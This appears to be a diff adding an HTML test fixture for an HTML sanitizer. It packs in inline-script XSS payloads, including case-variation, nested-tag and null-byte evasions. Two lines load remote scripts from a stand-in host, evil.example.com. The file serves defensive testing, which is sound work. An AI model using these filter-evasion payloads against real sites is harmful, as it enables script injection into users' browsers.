@@ -1,0 +1,44 @@
+<!doctype html>
+<!--
+  Inline script, in every form a parser will still execute.
+
+  Expectation: no <script> element survives sanitization, and no fragment of any of these
+  payloads appears in the render artifact in an executable position.
+-->
+<html>
+  <head>
+    <title>Inline script</title>
+    <script>
+      alert('xss');
+    </script>
+    <script type="text/javascript">
+      document.title = 'owned';
+    </script>
+  </head>
+  <body>
+    <h1>A perfectly ordinary heading</h1>
+
+    <script src="https://evil.example.com/payload.js"></script>
+
+    <p>Text between scripts, which must survive.</p>
+
+    <!-- Case variation, because a denylist that matches "script" often misses this. -->
+    <SCRIPT>alert('case')</SCRIPT>
+    <ScRiPt>alert('mixed')</ScRiPt>
+
+    <!-- Nested, so that naive tag stripping reassembles a working tag. -->
+    <scr<script>ipt>alert('nested')</scr</script>ipt>
+
+    <!-- Null byte splitting. -->
+    <scri&#0;pt>alert('null')</scri&#0;pt>
+
+    <!-- A module, which some sanitizers overlook because it is newer. -->
+    <script type="module">
+      import('https://evil.example.com/module.js');
+    </script>
+
+    <noscript><p>Fallback text.</p></noscript>
+
+    <p>Final paragraph, which must survive.</p>
+  </body>
+</html>
